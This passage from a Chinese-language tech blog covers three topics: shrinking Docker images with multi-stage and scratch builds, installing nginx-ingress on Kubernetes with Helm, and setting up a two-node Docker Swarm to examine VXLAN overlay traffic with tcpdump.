<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker images</span><br><span class="line">REPOSITORY                                                          TAG        IMAGE ID       CREATED          SIZE</span><br><span class="line">hello                                                               1.0        3a1caaa45859   12 minutes ago   671MB</span><br><span class="line">hello-multi-stage                                                   1.0        1579543c9b16   15 minutes ago   177MB</span><br></pre></td></tr></table></figure>
<p>效果：镜像体积从 671MB 压缩到 177MB</p>
<h2><span id="进一步优化使用-scratch-镜像">进一步优化：使用 scratch 镜像</span></h2><p>scratch 是 Docker 提供的一个空镜像，没有任何操作系统层或预装软件。它非常适合用于以下场景：</p>
<ul>
<li>静态编译的应用程序：如 Go 或 C&#x2F;C++ 编写的程序，编译后生成的可执行文件不需要动态链接库支持</li>
<li>最小化攻击面：由于没有操作系统层，几乎不存在因系统漏洞被攻击的风险</li>
<li>快速部署：极小的镜像体积意味着更快的上传、下载和启动速度</li>
</ul>
<p>Dockerfile如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM rockylinux:9.3 AS builder</span><br><span class="line">RUN dnf install -y golang git</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY . .</span><br><span class="line">RUN go mod init example.com/hello</span><br><span class="line">RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o hello .</span><br><span class="line"></span><br><span class="line"># 第二阶段：运行环境, 基础镜像改为 scratch</span><br><span class="line">FROM scratch</span><br><span class="line">COPY --from=builder /app/hello .</span><br><span class="line">CMD [&quot;./hello&quot;]</span><br></pre></td></tr></table></figure>
<p>构建与运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t hello-tiny:1.0 .</span><br><span class="line">docker run -it --rm hello-tiny:1.0</span><br></pre></td></tr></table></figure>
<p>查看镜像大小</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">REPOSITORY              TAG        IMAGE ID       CREATED          SIZE</span><br><span class="line">hello-tiny              1.0        40fd75a4f0ee   10 minutes ago   1.89MB</span><br><span class="line">hello                   1.0        3a1caaa45859   12 minutes ago   671MB</span><br><span class="line">hello-multi-stage       1.0        1579543c9b16   15 minutes ago   177MB</span><br></pre></td></tr></table></figure>
<p>效果: 镜像从177MB压缩到1.89M</p>
<p>构建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t hello-tiny:1.0 .</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker run -it --rm hello-tiny:1.0</span><br><span class="line">Hello, World!</span><br></pre></td></tr></table></figure>
<p>查看镜像大小</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker images</span><br><span class="line">REPOSITORY                                                          TAG        IMAGE ID       CREATED          SIZE</span><br><span class="line">hello-tiny                                                          1.0        40fd75a4f0ee   10 minutes ago   1.89MB</span><br><span class="line">hello                                                               1.0        3a1caaa45859   12 minutes ago   671MB</span><br><span class="line">hello-multi-stage                                                   1.0        1579543c9b16   15 minutes ago   177MB</span><br></pre></td></tr></table></figure>


<h1><span id="其他几种常见的压缩-docker-镜像的方法">其他几种常见的压缩 Docker 镜像的方法</span></h1><p>1.选择合适的基础镜像</p>
<ul>
<li>Alpine Linux：一个轻量级的Linux发行版，通常比其他基础镜像（如Ubuntu或Debian）要小得多。</li>
<li>Scratch：一个完全空白的基础镜像，适合静态编译的应用程序，如Go语言编写的应用程序。</li>
<li>选择更小版本的基础镜像：例如，使用 python:3.8-slim 而不是 python:3.8。</li>
</ul>
<p>2.删除不必要的文件和依赖</p>
<ul>
<li>在 Dockerfile 中执行清理操作，如移除安装包缓存或不需要的开发工具, 例如&#96;RUN apt-get clean &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*</li>
</ul>
<p>3.合并命令以减少层数</p>
<ul>
<li>每个 RUN 命令都会创建一个新的层。通过合并相关的命令到一个 RUN 指令中，可以减少最终镜像的层数，从而缩小镜像大小。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">    package-one \</span><br><span class="line">    package-two \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br></pre></td></tr></table></figure></li>
</ul>
<p>4.使用 .dockerignore 文件</p>
<ul>
<li>类似于 .gitignore，.dockerignore 文件可以指定哪些文件和目录不应包含在构建上下文中，从而避免不必要的文件被添加到镜像中。</li>
</ul>
<p>5.利用 <code>Docker Squash</code>等外部工具优化, 将镜像中的多层合并为一层，减少最终镜像的大小</p>
<h1><span id="参考">参考</span></h1><p><a href="https://yeasy.gitbook.io/docker_practice/image/multistage-builds">Dockerfile 多阶段构建</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Helm快速上手: 使用Helm安装nginx-ingress</title>
    <url>/2025/0320212856.html</url>
    <content><![CDATA[<h1><span id="什么是helm-helm解决了哪些问题">什么是Helm? Helm解决了哪些问题?</span></h1><p>Helm是Kubernetes的包管理工具，类似于Linux中的apt或yum. Helm通过模板化和版本控制等机制, 帮助用户快速发现、共享和使用Kubernetes应用</p>
<p>在Helm出现之前，部署Kubernetes应用存在以下问题:<br><strong>1. YAML配置复杂，部署和管理Kubernetes应用不方便</strong></p>
<ul>
<li>问题：需要编写大量YAML文件定义Kubernetes资源。 随着项目规模增长, 维护这些配置文件变得困难, 尤其是在多环境部署时</li>
<li>Helm解决方案: 通过Helm模板功能，开发者可以创建一个Chart, 包含所有必要的Kubernetes资源定义, 并使用变量代替硬编码值</li>
</ul>
<p><strong>2. 更新或回滚到特定版本较为困难</strong></p>
<ul>
<li>问题：缺乏版本控制功能，难以更新或回滚到指定版本。如果直接修改线上 YAML 文件，可能导致问题且难以恢复到稳定状态</li>
<li>Helm解决方案: Helm 通过Release概念支持版本控制，每次部署或更新应用时都会创建一个新的Release. 如果新版本出现问题, 可以通过helm rollback快速回滚到之前的稳定版本</li>
</ul>
<p><strong>3. 难以共享或复用k8s配置, 不利于多团队协作</strong></p>
<ul>
<li>问题：在一个团队内部，不同项目可能有相似需求（如都需要部署同一套系统）。然而，由于缺少有效的共享机制，每个项目需要从头开始配置，浪费了大量时间精力</li>
<li>Helm解决方案: Helm Charts 可以通过仓库共享，每个人可以从仓库中下载官方或其他团队成员发布的Charts，也可以上传自己的Charts，实现了Kubernetes配置的共享和复用</li>
</ul>
<h1><span id="快速上手helm">快速上手Helm</span></h1><h2><span id="helm的三个基本概念">Helm的三个基本概念</span></h2><ul>
<li>Chart, 一个Helm安装包，包含了运行一个应用所需要的镜像、依赖和资源定义等</li>
<li>Release, 在Kubernetes集群上运行的一个Chart实例</li>
<li>Repository, 发布和存储Chart的仓库</li>
</ul>
<span id="more"></span>

<h2><span id="安装helm">安装Helm</span></h2><p>首先安装Kubernetes集群, 参考: <a href="https://blog.csdn.net/pcj_888/article/details/144240636">kubeadm+keepalived+HAproxy搭建高可用kubernetes集群</a></p>
<p>查看kubernetes版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl version</span><br><span class="line">Server Version: v1.28.2</span><br></pre></td></tr></table></figure>

<p>根据<a href="https://helm.sh/docs/topics/version_skew/">官方文档</a>找到匹配的 Helm 版本进行安装。例如，我的 Kubernetes 版本是 v1.28.2，因此选择安装 Helm v3.16.0：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Helm Version	Supported Kubernetes Versions</span><br><span class="line">3.17.x	1.32.x - 1.29.x</span><br><span class="line">3.16.x	1.31.x - 1.28.x</span><br></pre></td></tr></table></figure>
<p>安装Helm方法如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL -o helm-v3.16.0-linux-amd64.tar.gz https://get.helm.sh/helm-v3.16.0-linux-amd64.tar.gz</span><br><span class="line">tar -zxvf helm-v3.16.0-linux-amd64.tar.gz</span><br><span class="line">mv linux-amd64/helm /usr/local/bin/helm</span><br><span class="line">helm version</span><br><span class="line">version.BuildInfo&#123;Version:&quot;v3.16.0&quot;, GitCommit:&quot;0d439e1a09683f21a0ab9401eb661401f185b00b&quot;, GitTreeState:&quot;clean&quot;, GoVersion:&quot;go1.22.6&quot;&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="使用helm安装nginx-ingress">使用Helm安装Nginx Ingress</span></h1><p><strong>步骤1: 添加官方Helm仓库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm repo add my-ingress https://kubernetes.github.io/ingress-nginx</span><br></pre></td></tr></table></figure>
<p>查看已添加的仓库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm repo list</span><br><span class="line">NAME            URL</span><br><span class="line">my-ingress      https://kubernetes.github.io/ingress-nginx</span><br></pre></td></tr></table></figure>
<p>更新软件源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># helm repo update</span><br><span class="line">Hang tight while we grab the latest from your chart repositories...</span><br><span class="line">...Successfully got an update from the &quot;my-ingress&quot; chart repository</span><br><span class="line">Update Complete. ⎈Happy Helming!⎈</span><br></pre></td></tr></table></figure>

<p><strong>步骤2: 查找合适的Nginx Ingress版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># helm search repo ingress-nginx</span><br><span class="line">NAME                            CHART VERSION   APP VERSION     DESCRIPTION</span><br><span class="line">my-ingress/ingress-nginx        4.12.0          1.12.0          Ingress controller for Kubernetes using NGINX a...</span><br><span class="line"></span><br><span class="line">[root@k8s-master1 ~]# helm search repo ingress-nginx --versions | head -n 4</span><br><span class="line">NAME                            CHART VERSION   APP VERSION     DESCRIPTION</span><br><span class="line">my-ingress/ingress-nginx        4.12.0          1.12.0          Ingress controller for Kubernetes using NGINX a...</span><br><span class="line">my-ingress/ingress-nginx        4.11.4          1.11.4          Ingress controller for Kubernetes using NGINX a...</span><br><span class="line">my-ingress/ingress-nginx        4.11.3          1.11.3          Ingress controller for Kubernetes using NGINX a...</span><br></pre></td></tr></table></figure>

<p>查阅<a href="https://github.com/kubernetes/ingress-nginx">ingress-nginx官方文档</a>, 确认与Kubernetes 1.28匹配的Ingress版本范围为v1.9.0 - v1.12.0, 我选择安装v1.11.4</p>
<p><strong>步骤3: 下载Nginx Ingress, 并修改配置</strong><br>下载指定版本的Chart</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm pull my-ingress/ingress-nginx --version 4.11.4</span><br></pre></td></tr></table></figure>
<p>解压并修改配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar xf ingress-nginx-4.11.4.tgz</span><br><span class="line"></span><br><span class="line"># 修改配置文件values.yaml</span><br><span class="line">sed -i &#x27;/registry:/s#registry.k8s.io#swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io#g&#x27; ingress-nginx/values.yaml</span><br><span class="line">sed -ri &#x27;/digest:/s@^@#@&#x27; ingress-nginx/values.yaml</span><br><span class="line">sed -i &#x27;/hostNetwork:/s#false#true#&#x27; ingress-nginx/values.yaml</span><br><span class="line">sed -i  &#x27;/dnsPolicy/s#ClusterFirst#ClusterFirstWithHostNet#&#x27; ingress-nginx/values.yaml</span><br><span class="line">sed -i &#x27;/kind/s#Deployment#DaemonSet#&#x27; ingress-nginx/values.yaml </span><br><span class="line">sed -i &#x27;s/type: LoadBalancer/type: NodePort/&#x27; ingress-nginx/values.yaml</span><br></pre></td></tr></table></figure>
<p>说明:</p>
<ul>
<li>镜像改成国内的, 国内由于网络问题无法下载海外镜像</li>
<li>注释掉digest, 因为国内镜像可能被重新构建过, digest并不相同</li>
<li>hostNetwork设为true, 直接监听宿主机80和443端口 (可选)</li>
<li>如果设置了hostNetwork为true, 建议将dnsPolicy改为ClusterFirstWithHostNet, 以便使用k8s内部的service名称解析</li>
<li>Deployment改成DaemonSet类型, 每个节点部署一个Pod (可选)</li>
<li>将LoadBalancer类型改为NodePort, 适用于本地测试环境</li>
</ul>
<p><strong>步骤4: 创建Namespace并安装Nginx Ingress</strong><br>为ingress-nginx创建namespace</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl create namespace ingress-nginx</span><br></pre></td></tr></table></figure>

<p>使用helm安装ingress-nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm install ingress-nginx ./ingress-nginx --namespace ingress-nginx</span><br></pre></td></tr></table></figure>

<p><strong>步骤5: 验证</strong><br>检查Pod状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n ingress-nginx get pods  -o wide</span><br><span class="line">NAME                             READY   STATUS    RESTARTS   AGE   IP               NODE         NOMINATED NODE   READINESS GATES</span><br><span class="line">ingress-nginx-controller-bst66   1/1     Running   0          38s   192.168.52.101   k8s-slave1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">ingress-nginx-controller-g6b2t   1/1     Running   0          38s   192.168.52.103   k8s-slave3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">ingress-nginx-controller-hsm5d   1/1     Running   0          38s   192.168.52.102   k8s-slave2   &lt;none&gt;           &lt;none&gt;</span><br></pre></td></tr></table></figure>
<p>检查Service状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n ingress-nginx get svc</span><br><span class="line">NAME                                 TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)                      AGE</span><br><span class="line">ingress-nginx-controller             NodePort    10.98.244.186   &lt;none&gt;        80:30158/TCP,443:30756/TCP   48s</span><br><span class="line">ingress-nginx-controller-admission   ClusterIP   10.99.235.151   &lt;none&gt;        443/TCP                      48s</span><br></pre></td></tr></table></figure>
<p>访问测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从集群内部访问</span><br><span class="line"># curl 10.110.172.220:80</span><br><span class="line">404 Not Found (404是OK的, 说明80端口已LISTEN, Nginx响应了请求) </span><br><span class="line"></span><br><span class="line"># 从节点访问</span><br><span class="line">curl k8s-slave1:80</span><br><span class="line"></span><br><span class="line"># 通过 NodePort 访问</span><br><span class="line">curl k8s-master1:31481</span><br></pre></td></tr></table></figure>

<p><strong>卸载应用</strong><br>查看当前安装的应用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># helm -n ingress-nginx list</span><br><span class="line">NAME            NAMESPACE       REVISION        UPDATED                                 STATUS          CHART                   APP VERSION</span><br><span class="line">ingress-nginx   ingress-nginx   1               2025-03-23 13:14:28.226951332 +0800 CST deployed        ingress-nginx-4.11.4    1.11.4</span><br></pre></td></tr></table></figure>
<p>使用<code>helm uninstall</code>卸载应用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm -n ingress-nginx uninstall ingress-nginx</span><br></pre></td></tr></table></figure>

<h1><span id="ingress配置ssl证书">Ingress配置SSL证书</span></h1><p>TODO</p>
<h1><span id="参考">参考</span></h1><p>【1】 <a href="https://docs.daocloud.io/kpanda/user-guide/helm/">https://docs.daocloud.io/kpanda/user-guide/helm/</a><br>【2】 <a href="https://jimmysong.io/kubernetes-handbook/practice/helm.html">使用Helm管理kubernetes应用</a><br>【3】 <a href="https://www.cnblogs.com/yinzhengjie/p/17975829">Ingress-Nginx使用指南</a><br>【4】 <a href="https://wiki.opskumu.com/kubernetes/helm/helm-quickstart">Helm 快速上手</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>通过 Docker Swarm 集群探究 Overlay 网络跨主机通信原理</title>
    <url>/2025/0330154644.html</url>
    <content><![CDATA[<h1><span id="什么是overlay网络-用于解决什么问题">什么是Overlay网络, 用于解决什么问题 ?</span></h1><p>Overlay网络通过在现有网络之上创建一个虚拟网络层, 解决不同主机的容器之间相互通信的问题<br>如果没有Overlay网络，实现跨主机的容器通信通常需要以下方法：</p>
<ul>
<li>端口映射</li>
<li>使用宿主机网络模式</li>
</ul>
<p>这些方法牺牲了容器网络隔离的优势, 并且可能导致端口冲突问题</p>
<p>以下搭建一个简易的Docker Swarm 集群(一主一从), 探究 Overlay 网络下不同节点上的容器间互相通信的原理</p>
<span id="more"></span>

<h1><span id="搭建一主一从-docker-swarm-集群">搭建一主一从 Docker Swarm 集群</span></h1><h2><span id="0-准备环境">0. 准备环境</span></h2><p>准备两台Linux虚拟机(我使用Rocky Linux 9.5), 确保两台机器都安装了 Docker，并且能够通过网络互相访问。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.203 swarm-master1 </span><br><span class="line">192.168.52.204 swarm-slave1 </span><br></pre></td></tr></table></figure>

<h2><span id="1-初始化-docker-swarm-集群">1. 初始化 Docker Swarm 集群</span></h2><p>在主节点 swarm-master1 上初始化 Swarm 集群</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker swarm init --advertise-addr 192.168.52.203</span><br></pre></td></tr></table></figure>
<p>执行成功后, 看到如下输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Swarm initialized: current node (kc5nui94soxcjxi2pbqml13ig) is now a manager.</span><br><span class="line"></span><br><span class="line">To add a worker to this swarm, run the following command:</span><br><span class="line"></span><br><span class="line">    docker swarm join --token SWMTKN-1-3t8jt95v04knqr2tvxqd0m1j0dspw3s5hqukcwgkskikulbxgv-bw8rbewoh80240tto2os0dwtv 192.168.52.203:2377</span><br><span class="line"></span><br><span class="line">To add a manager to this swarm, run &#x27;docker swarm join-token manager&#x27; and follow the instructions.</span><br></pre></td></tr></table></figure>
<h2><span id="2-将从节点加入集群">2. 将从节点加入集群</span></h2><p>复制上述输出中的 <code>docker swarm join</code> 命令，在从节点 swarm-slave1 上执行该命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker swarm join --token SWMTKN-1-3t8jt95v04knqr2tvxqd0m1j0dspw3s5hqukcwgkskikulbxgv-bw8rbewoh80240tto2os0dwtv 192.168.52.203:2377</span><br></pre></td></tr></table></figure>
<p>成功后, 看到如下提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure>

<p><strong>验证集群状态</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker node ls</span><br><span class="line">ID                            HOSTNAME                STATUS    AVAILABILITY   MANAGER STATUS   ENGINE VERSION</span><br><span class="line">kc5nui94soxcjxi2pbqml13ig *   localhost.localdomain   Ready     Active         Leader           28.0.2</span><br><span class="line">suzfvrhfn2d8g5digv7u05yz4     swarm-slave1            Ready     Active                          28.0.2</span><br></pre></td></tr></table></figure>

<h2><span id="3-创建overlay网络">3. 创建overlay网络</span></h2><p>在主节点上创建一个 overlay 网络, 用于跨主机容器通信</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker network create -d overlay my-overlay-network</span><br></pre></td></tr></table></figure>
<p>这将创建一个名为 my-overlay-network 的 overlay 网络</p>
<h2><span id="4-每个节点部署一个rocky-linux容器">4. 每个节点部署一个Rocky Linux容器</span></h2><p>在主节点上运行以下命令，在主节点启动一个 Rocky Linux 容器，并将其连接到 my-overlay-network 网络中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker service create \</span><br><span class="line">  --name rocky-master \</span><br><span class="line">  --network my-overlay-network \</span><br><span class="line">  rockylinux:9.3 \</span><br><span class="line">  sleep infinity</span><br></pre></td></tr></table></figure>

<p>在主节点上运行以下命令，指定容器运行在从节点上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker service create \</span><br><span class="line">  --name rocky-slave \</span><br><span class="line">  --constraint &#x27;node.hostname == swarm-slave1&#x27; \</span><br><span class="line">  --network my-overlay-network \</span><br><span class="line">  rockylinux:9.3 \</span><br><span class="line">  sleep infinity</span><br></pre></td></tr></table></figure>

<p>检查服务的状态，确保两个容器均已启动并正常运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker service ls</span><br><span class="line">ID             NAME           MODE         REPLICAS   IMAGE            PORTS</span><br><span class="line">1cd6vg54735o   rocky-master   replicated   1/1        rockylinux:9.3</span><br><span class="line">uh605ejlvsui   rocky-slave    replicated   1/1        rockylinux:9.3</span><br><span class="line"></span><br><span class="line"># docker service ps rocky-master</span><br><span class="line">ID             NAME             IMAGE            NODE            DESIRED STATE   CURRENT STATE         ERROR     PORTS</span><br><span class="line">g45cjkctal9c   rocky-master.1   rockylinux:9.3   swarm-master1   Running         Running 3 hours ago</span><br><span class="line"></span><br><span class="line"># docker service ps rocky-slave</span><br><span class="line">ID             NAME            IMAGE            NODE           DESIRED STATE   CURRENT STATE         ERROR     PORTS</span><br><span class="line">7kh81mby5ryd   rocky-slave.1   rockylinux:9.3   swarm-slave1   Running         Running 3 hours ago</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2><span id="5-验证容器通信">5. 验证容器通信</span></h2><p>进入主节点的容器，ping从节点容器, 我的从节点容器IP为 10.0.1.104</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ping 10.0.1.104</span><br><span class="line">PING 10.0.1.104 (10.0.1.104) 56(84) bytes of data.</span><br><span class="line">64 bytes from 10.0.1.104: icmp_seq=1 ttl=64 time=0.306 ms</span><br></pre></td></tr></table></figure>

<p>如需清理 Docker Swarm 环境, 使用如下命令:</p>
<p>主节点停止集群</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker swarm leave --force</span><br></pre></td></tr></table></figure>
<p>从节点离开集群</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker swarm leave --force</span><br></pre></td></tr></table></figure>
<p>验证是否退出集群</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker info | grep &quot;Swarm&quot;</span><br></pre></td></tr></table></figure>
<p>如果显示 Swarm: inactive，说明该节点已成功退出 Swarm。</p>
<p>删除服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker service rm rocky_service</span><br></pre></td></tr></table></figure>
<p>删除Overlay网络</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker network rm my_overlay_network</span><br></pre></td></tr></table></figure>

<h1><span id="探究-overlay-网络原理">探究 Overlay 网络原理</span></h1><p>Docker Overlay 网络的工作流程图如下:</p>
<p><img data-src="/2025/0330154644/image1.png"></p>
<p>数据包发送流程说明:</p>
<ul>
<li>容器1发出ICMP请求报文, 目标地址10.0.1.103, 根据容器1的路由表, 该报文从容器1的eth0发出</li>
<li>容器1的eth0是一个veth pair的一端, 另一端位于一个独立的network namespace中(不是宿主机的network namespace), 报文通过veth pair从容器1传送到这个独立的network namespace中的虚拟网卡(veth1)</li>
<li>在独立命名空间中, veth1连接到虚拟网桥br0, br0根据MAC地址表, 把报文转发到vxlan0设备</li>
<li>vxlan0设备对原始以太网帧进行VXLAN封装, 具体过程是:<ul>
<li>加一个新的外层以太网头部, IP头部, UDP头部, 并添加VXLAN头部</li>
<li>设置源IP为主机A的IP(192.168.52.203), 设置目标IP为主机B的IP(192.168.52.204), UDP目标端口设置为4789</li>
<li>VXLAN头部中设置VNI(VXLAN Network Identifier), 一个24位字段, 用于标识当前的VXLAN网络</li>
</ul>
</li>
<li>封装后的VXLAN报文通过主机A的物理网卡ens160发送出去</li>
<li>主机B收到VXLAN报文后, 将其传递到独立命名空间中的 vxlan0 设备</li>
<li>vxlan0对报文进行解封装，恢复原始的以太网帧, 解封后的数据包进入虚拟网桥br0, br0根据MAC地址表, 将报文转发到容器2的veth设备</li>
<li>最终, 报文通过veth pair到达容器2的eth0, 容器2处理该ICMP请求并做出响应</li>
</ul>
<h2><span id="vxlan报文格式">VXLAN报文格式</span></h2><p><img data-src="/2025/0330154644/vxlan.png"></p>
<p>VXLAN报文格式主要是将原始的以太网帧封装进一个UDP数据包中(“MAC in UDP”)，包括以下部分：</p>
<ul>
<li>外层以太网头部：包含目标MAC地址、源MAC地址和以太网类型（对于VXLAN通常是0x0800）</li>
<li>外层IP头部：指定外部网络中的源IP地址和目标IP地址，用于跨网络传输</li>
<li>外层UDP头部：标准UDP头部信息，包括源端口、目的端口（通常为4789）</li>
<li>VXLAN头部：包含24位的VNI（VXLAN Network Identifier），用于区分不同的租户或逻辑网络</li>
<li>原始以太网帧：被封装的数据</li>
</ul>
<h2><span id="对vxlan报文抓包">对VXLAN报文抓包</span></h2><p>用tcpdump抓包抓ens160的VXLAN报文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># tcpdump -i ens160 port 4789 -nn -vv</span><br><span class="line">dropped privs to tcpdump</span><br><span class="line">tcpdump: listening on ens160, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">15:29:36.888607 IP (tos 0x0, ttl 64, id 43464, offset 0, flags [none], proto UDP (17), length 134)</span><br><span class="line">    192.168.52.203.35153 &gt; 192.168.52.204.4789: [bad udp cksum 0xeb6b -&gt; 0x4bbc!] VXLAN, flags [I] (0x08), vni 4097</span><br><span class="line">IP (tos 0x0, ttl 64, id 57583, offset 0, flags [DF], proto ICMP (1), length 84)</span><br><span class="line">    10.0.1.100 &gt; 10.0.1.103: ICMP echo request, id 20, seq 122, length 64</span><br><span class="line">15:29:36.888820 IP (tos 0x0, ttl 64, id 20056, offset 0, flags [none], proto UDP (17), length 134)</span><br><span class="line">    192.168.52.204.57523 &gt; 192.168.52.203.4789: [udp sum ok] VXLAN, flags [I] (0x08), vni 4097</span><br><span class="line">IP (tos 0x0, ttl 64, id 3391, offset 0, flags [none], proto ICMP (1), length 84)</span><br><span class="line">    10.0.1.103 &gt; 10.0.1.100: ICMP echo reply, id 20, seq 122, length 64</span><br></pre></td></tr></table></figure>
<p>导出pcap文件, 再用wireshark分析 (我用的VMware NAT虚拟机, 直接在Windows物理机上用wireshark抓vmnet8的报文也可以)</p>
<p><img data-src="/2025/0330154644/image2.png"></p>
<p><img data-src="/2025/0330154644/image3.png"></p>
<h1><span id="分析过程">分析过程</span></h1><p>查看主机A的网卡和路由表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ip addr</span><br><span class="line">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:68:16:97 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp3s0</span><br><span class="line">    inet 192.168.52.203/24 brd 192.168.52.255 scope global noprefixroute ens160</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fe68:1697/64 scope link noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="line">    link/ether ee:70:00:b9:06:99 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: docker_gwbridge: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether fe:d7:43:f4:5e:0a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global docker_gwbridge</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::fcd7:43ff:fef4:5e0a/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">9: veth2c2d786@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker_gwbridge state UP group default</span><br><span class="line">    link/ether f2:1d:db:39:8c:d7 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">    inet6 fe80::f01d:dbff:fe39:8cd7/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">392: veth04de33f@if391: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker_gwbridge state UP group default</span><br><span class="line">    link/ether 5a:ac:6c:6b:55:4f brd ff:ff:ff:ff:ff:ff link-netnsid 4</span><br><span class="line">    inet6 fe80::58ac:6cff:fe6b:554f/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line"># route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">0.0.0.0         192.168.52.2    0.0.0.0         UG    100    0        0 ens160</span><br><span class="line">172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0</span><br><span class="line">172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker_gwbridge</span><br><span class="line">192.168.52.0    0.0.0.0         255.255.255.0   U     100    0        0 ens160</span><br></pre></td></tr></table></figure>

<p>进入容器1, 查看容器1的网卡和路由表</p>
